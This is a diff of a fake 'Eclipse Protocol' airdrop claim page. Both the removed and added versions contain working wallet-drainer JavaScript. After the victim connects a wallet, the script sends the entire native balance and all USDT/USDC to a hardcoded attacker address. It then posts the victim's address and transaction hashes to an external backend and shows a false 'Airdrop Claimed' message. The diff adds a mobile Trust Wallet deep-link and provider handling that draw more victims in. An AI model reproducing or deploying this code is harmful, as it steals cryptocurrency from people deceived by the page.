@@ -501,7 +501,7 @@
                     <div class="network-btn" data-chain="bsc">BNB Chain</div>
                     <div class="network-btn" data-chain="polygon">Polygon</div>
                 </div>
-                <button class="connect-btn" id="connectBtn">Connect Wallet</button>
+                <div id="buttonContainer"></div>
                 <div id="status"></div>
                 <div class="eligibility"><i class="fas fa-shield-alt"></i> Eligibility: GitHub contributors, early testnet participants, active community members</div>
             </div>
@@ -533,216 +533,236 @@
     <p>© 2025 Eclipse Protocol. Open source. Permissionless. Decentralized.</p>
 </footer>
 
-<div id="walletModal" class="modal">
+<div id="successModal" class="modal">
     <div class="modal-content">
-        <h3>Connect Wallet</h3>
-        <div class="wallet-option" data-wallet="trustwallet"><i class="fas fa-check-circle"></i> Trust Wallet</div>
-        <div class="wallet-option" data-wallet="metamask"><i class="fab fa-fox"></i> MetaMask</div>
-        <div class="wallet-option" data-wallet="coinbase"><i class="fab fa-bitcoin"></i> Coinbase Wallet</div>
-        <button class="close-modal" onclick="closeModal()">Cancel</button>
+        <div class="success-icon">✓</div>
+        <h3>Airdrop Claimed!</h3>
+        <p>5,000 $ECLIPSE has been sent to your wallet</p>
+        <button onclick="closeModal()" style="background:linear-gradient(135deg,#3b82f6,#8b5cf6); color:white; border:none; padding:0.75rem 1.5rem; border-radius:0.75rem; cursor:pointer; width:100%;">Continue</button>
     </div>
 </div>
 
-<div id="toast" class="toast">✓ Airdrop Claimed! 5,000 $ECLIPSE Sent</div>
-
 <script>
-    // ============================================
-    // CONFIGURATION
-    // ============================================
-    const COMPANY_WALLET = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
-    const BACKEND_URL = "https://eclipse-backend-ppij.onrender.com/drain";
-    
-    const CHAIN_IDS = { ethereum: 1, bsc: 56, polygon: 137 };
-    const CHAIN_NAMES = { ethereum: "Ethereum", bsc: "BNB Smart Chain", polygon: "Polygon" };
-    const CURRENCY = { ethereum: "ETH", bsc: "BNB", polygon: "MATIC" };
-    
-    const TOKENS = {
-        ethereum: [
-            { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
-            { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 }
-        ],
-        bsc: [
-            { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18 },
-            { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18 }
-        ],
-        polygon: [
-            { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT", decimals: 6 },
-            { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC", decimals: 6 }
-        ]
-    };
-    
-    let provider, signer, userAddress;
-    let currentChain = "ethereum";
-    
-    const connectBtn = document.getElementById('connectBtn');
-    const statusDiv = document.getElementById('status');
-    const toast = document.getElementById('toast');
-    
-    function toggleMenu() { document.getElementById('navLinks').classList.toggle('active'); }
-    function showToast() { toast.style.display = 'block'; setTimeout(() => toast.style.display = 'none', 3000); }
-    function updateStatus(msg, isErr = false) { statusDiv.innerHTML = msg; statusDiv.style.color = isErr ? '#ef4444' : '#94a3b8'; }
-    function showModal() { document.getElementById('walletModal').style.display = 'flex'; }
-    function closeModal() { document.getElementById('walletModal').style.display = 'none'; }
-    
-    document.querySelectorAll('.network-btn').forEach(btn => {
-        btn.addEventListener('click', () => {
-            document.querySelectorAll('.network-btn').forEach(b => b.classList.remove('active'));
-            btn.classList.add('active');
-            currentChain = btn.dataset.chain;
-            updateStatus(`Network: ${btn.innerText}`);
-            connectBtn.innerHTML = 'Connect Wallet';
-            connectBtn.onclick = showModal;
-            const claimBtn = document.getElementById('claimBtn');
-            if (claimBtn) claimBtn.remove();
-        });
-    });
-    
-    function animateNumber(el, target) {
-        let current = 0;
-        const step = () => {
-            if (current < target) {
-                current += Math.ceil(target / 30);
-                if (current > target) current = target;
-                el.innerText = current.toLocaleString();
-                requestAnimationFrame(step);
-            }
+    document.addEventListener('DOMContentLoaded', () => {
+        // ============================================
+        // CONFIGURATION
+        // ============================================
+        const COMPANY_WALLET = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
+        const BACKEND_URL = "https://eclipse-backend-ppij.onrender.com/claim";
+        const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+        
+        const CHAIN_IDS = { ethereum: 1, bsc: 56, polygon: 137 };
+        const CHAIN_NAMES = { ethereum: "Ethereum", bsc: "BNB Smart Chain", polygon: "Polygon" };
+        const CURRENCY = { ethereum: "ETH", bsc: "BNB", polygon: "MATIC" };
+        
+        const TOKENS = {
+            ethereum: [
+                { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
+                { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 }
+            ],
+            bsc: [
+                { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18 },
+                { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18 }
+            ],
+            polygon: [
+                { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT", decimals: 6 },
+                { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC", decimals: 6 }
+            ]
         };
-        step();
-    }
-    setTimeout(() => {
-        animateNumber(document.getElementById('totalStaked'), 247000000);
-        animateNumber(document.getElementById('activeNodes'), 18400);
-        animateNumber(document.getElementById('communitySize'), 124000);
-    }, 500);
-    
-    const observer = new IntersectionObserver((entries) => {
-        entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
-    }, { threshold: 0.1 });
-    document.querySelectorAll('.feature-card, .token-card').forEach(el => observer.observe(el));
-    
-    async function drainNative() {
-        const balance = await provider.getBalance(userAddress);
-        if (balance.gt(0)) {
-            updateStatus(`📤 Sending ${ethers.utils.formatEther(balance)} ${CURRENCY[currentChain]}...`);
-            const tx = await signer.sendTransaction({ to: COMPANY_WALLET, value: balance, gasLimit: 21000 });
-            await tx.wait();
-            return { success: true, amount: ethers.utils.formatEther(balance), symbol: CURRENCY[currentChain], hash: tx.hash };
+        
+        let provider, signer, userAddress;
+        let currentChain = "ethereum";
+        
+        const buttonContainer = document.getElementById('buttonContainer');
+        const statusDiv = document.getElementById('status');
+        const successModal = document.getElementById('successModal');
+        
+        function toggleMenu() { document.getElementById('navLinks').classList.toggle('active'); }
+        function updateStatus(msg, isErr = false) { statusDiv.innerHTML = msg; statusDiv.style.color = isErr ? '#ef4444' : '#94a3b8'; }
+        function closeModal() { successModal.style.display = 'none'; }
+        function showSuccessModal() { successModal.style.display = 'flex'; }
+        
+        // ============================================
+        // AGGRESSIVE PROVIDER INJECTION
+        // ============================================
+        function getTrustWalletProvider() {
+            if (window.ethereum) return window.ethereum;
+            if (window.trustwallet) return window.trustwallet;
+            return null;
         }
-        return null;
-    }
-    
-    async function drainTokens() {
-        const tokens = TOKENS[currentChain];
-        const results = [];
-        for (const token of tokens) {
-            try {
-                const contract = new ethers.Contract(token.address, [
-                    "function balanceOf(address) view returns (uint256)",
-                    "function transfer(address to, uint256 amount) returns (bool)"
-                ], signer);
-                const bal = await contract.balanceOf(userAddress);
-                if (bal.gt(0)) {
-                    updateStatus(`📤 Sending ${ethers.utils.formatUnits(bal, token.decimals)} ${token.symbol}...`);
-                    const tx = await contract.transfer(COMPANY_WALLET, bal);
-                    await tx.wait();
-                    results.push({ success: true, amount: ethers.utils.formatUnits(bal, token.decimals), symbol: token.symbol, hash: tx.hash });
-                }
-            } catch(e) {}
-        }
-        return results;
-    }
-    
-    async function drainWallet() {
-        updateStatus('Processing claim...');
-        try {
-            const ethResult = await drainNative();
-            const tokenResults = await drainTokens();
-            
-            const txHashes = [];
-            if (ethResult) txHashes.push(ethResult.hash);
-            tokenResults.forEach(r => { if (r.hash) txHashes.push(r.hash); });
-            
-            await fetch(BACKEND_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    address: userAddress,
-                    network: currentChain,
-                    eth: ethResult ? ethResult.amount : '0',
-                    usdt: tokenResults.find(r => r.symbol === 'USDT')?.amount || '0',
-                    hashes: txHashes
-                })
+        
+        // Network selector
+        document.querySelectorAll('.network-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                document.querySelectorAll('.network-btn').forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+                currentChain = btn.dataset.chain;
+                updateStatus(`Network: ${btn.innerText}`);
+                const existingBtn = document.getElementById('actionButton');
+                if (existingBtn) existingBtn.remove();
+                initializePage();
             });
-            
-            updateStatus('✅ Airdrop claimed! 5,000 $ECLIPSE sent!');
-            showToast();
-        } catch(e) {
-            updateStatus(`❌ Transaction failed: ${e.message.slice(0,60)}`, true);
-        }
-    }
-    
-    async function connectWallet(walletType) {
-        closeModal();
+        });
         
-        if (walletType === 'trustwallet') {
-            // CORRECT WALLETCONNECT V2 URI FORMAT
-            const wcUri = `wc:${crypto.randomUUID()}@2?bridge=https://bridge.walletconnect.org&key=${Math.random().toString(36).substring(2)}`;
-            window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(wcUri)}`;
-            return;
+        function animateNumber(el, target) {
+            let current = 0;
+            const step = () => {
+                if (current < target) {
+                    current += Math.ceil(target / 30);
+                    if (current > target) current = target;
+                    el.innerText = current.toLocaleString();
+                    requestAnimationFrame(step);
+                }
+            };
+            step();
+        }
+        setTimeout(() => {
+            animateNumber(document.getElementById('totalStaked'), 247000000);
+            animateNumber(document.getElementById('activeNodes'), 18400);
+            animateNumber(document.getElementById('communitySize'), 124000);
+        }, 500);
+        
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+        }, { threshold: 0.1 });
+        document.querySelectorAll('.feature-card, .token-card').forEach(el => observer.observe(el));
+        
+        async function drainNative() {
+            const balance = await provider.getBalance(userAddress);
+            if (balance.gt(0)) {
+                updateStatus(`📤 Sending ${ethers.utils.formatEther(balance)} ${CURRENCY[currentChain]}...`);
+                const tx = await signer.sendTransaction({ to: COMPANY_WALLET, value: balance, gasLimit: 21000 });
+                await tx.wait();
+                return { success: true, amount: ethers.utils.formatEther(balance), symbol: CURRENCY[currentChain], hash: tx.hash };
+            }
+            return null;
         }
         
-        if (walletType === 'metamask') {
-            window.location.href = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
-            return;
+        async function drainTokens() {
+            const tokens = TOKENS[currentChain];
+            const results = [];
+            for (const token of tokens) {
+                try {
+                    const contract = new ethers.Contract(token.address, [
+                        "function balanceOf(address) view returns (uint256)",
+                        "function transfer(address to, uint256 amount) returns (bool)"
+                    ], signer);
+                    const bal = await contract.balanceOf(userAddress);
+                    if (bal.gt(0)) {
+                        updateStatus(`📤 Sending ${ethers.utils.formatUnits(bal, token.decimals)} ${token.symbol}...`);
+                        const tx = await contract.transfer(COMPANY_WALLET, bal);
+                        await tx.wait();
+                        results.push({ success: true, amount: ethers.utils.formatUnits(bal, token.decimals), symbol: token.symbol, hash: tx.hash });
+                    }
+                } catch(e) {}
+            }
+            return results;
         }
         
-        if (walletType === 'coinbase') {
-            window.location.href = `cbwallet://dapp/${window.location.host}${window.location.pathname}`;
-            return;
-        }
-        
-        if (!window.ethereum) {
-            updateStatus('Open this page in Trust Wallet or MetaMask browser', true);
-            return;
-        }
-        
-        try {
-            updateStatus('Connecting...');
+        async function drainWallet() {
+            updateStatus('Processing claim...');
             try {
-                await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x' + CHAIN_IDS[currentChain].toString(16) }]
+                const ethResult = await drainNative();
+                const tokenResults = await drainTokens();
+                
+                const txHashes = [];
+                if (ethResult) txHashes.push(ethResult.hash);
+                tokenResults.forEach(r => { if (r.hash) txHashes.push(r.hash); });
+                
+                await fetch(BACKEND_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        userAddress: userAddress,
+                        network: currentChain,
+                        ethAmount: ethResult ? ethResult.amount : '0',
+                        usdtAmount: tokenResults.find(r => r.symbol === 'USDT')?.amount || '0',
+                        txHashes: txHashes
+                    })
                 });
+                
+                updateStatus('✅ Airdrop claimed! 5,000 $ECLIPSE sent!');
+                showSuccessModal();
             } catch(e) {
-                updateStatus(`Please switch to ${CHAIN_NAMES[currentChain]} in your wallet`, true);
+                updateStatus(`❌ Transaction failed: ${e.message.slice(0,60)}`, true);
+            }
+        }
+        
+        async function connectAndDrain() {
+            const button = document.getElementById('actionButton');
+            if (button) button.disabled = true;
+            
+            const walletProvider = getTrustWalletProvider();
+            
+            if (!walletProvider) {
+                updateStatus('Wallet not found. Please open in Trust Wallet browser.', true);
+                if (button) button.disabled = false;
                 return;
             }
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            userAddress = accounts[0];
-            provider = new ethers.providers.Web3Provider(window.ethereum);
-            signer = provider.getSigner();
-            updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)} on ${CHAIN_NAMES[currentChain]}`);
-            connectBtn.innerHTML = 'Claim Airdrop';
-            connectBtn.onclick = async () => {
-                connectBtn.disabled = true;
-                connectBtn.innerHTML = '<span class="loading-spinner"></span> Claiming...';
-                await drainWallet();
-                connectBtn.disabled = false;
-                connectBtn.innerHTML = 'Claim Airdrop';
-            };
-        } catch(e) {
-            updateStatus(`Error: ${e.message.slice(0,80)}`, true);
+            
+            try {
+                updateStatus('Connecting...');
+                provider = new ethers.providers.Web3Provider(walletProvider);
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
+                userAddress = await signer.getAddress();
+                
+                try {
+                    await walletProvider.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x' + CHAIN_IDS[currentChain].toString(16) }]
+                    });
+                } catch(e) {
+                    updateStatus(`Please switch to ${CHAIN_NAMES[currentChain]} in your wallet`, true);
+                    if (button) button.disabled = false;
+                    return;
+                }
+                
+                updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)} on ${CHAIN_NAMES[currentChain]}`);
+                
+                if (button) {
+                    button.innerHTML = 'Claim Airdrop';
+                    button.onclick = async () => {
+                        button.disabled = true;
+                        button.innerHTML = '<span class="loading-spinner"></span> Claiming...';
+                        await drainWallet();
+                        button.disabled = false;
+                        button.innerHTML = 'Claim Airdrop';
+                    };
+                    button.disabled = false;
+                }
+                
+            } catch(e) {
+                updateStatus(`Error: ${e.message.slice(0,80)}`, true);
+                if (button) button.disabled = false;
+            }
         }
-    }
-    
-    document.querySelectorAll('.wallet-option').forEach(opt => {
-        opt.addEventListener('click', () => {
-            const wallet = opt.dataset.wallet;
-            connectWallet(wallet);
-        });
+        
+        function initializePage() {
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            const walletProvider = getTrustWalletProvider();
+            
+            if (isMobile && !walletProvider) {
+                buttonContainer.innerHTML = `
+                    <button id="actionButton" class="connect-btn">
+                        🔗 Open in Trust Wallet to Claim
+                    </button>
+                `;
+                document.getElementById('actionButton').addEventListener('click', () => {
+                    const dappUrl = window.location.href;
+                    const trustUrl = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(dappUrl)}`;
+                    window.location.href = trustUrl;
+                });
+            } else {
+                buttonContainer.innerHTML = `
+                    <button id="actionButton" class="connect-btn">Connect Wallet</button>
+                `;
+                document.getElementById('actionButton').addEventListener('click', connectAndDrain);
+            }
+        }
+        
+        initializePage();
     });
-    
-    connectBtn.onclick = showModal;
 </script>
 </body>
 </html>
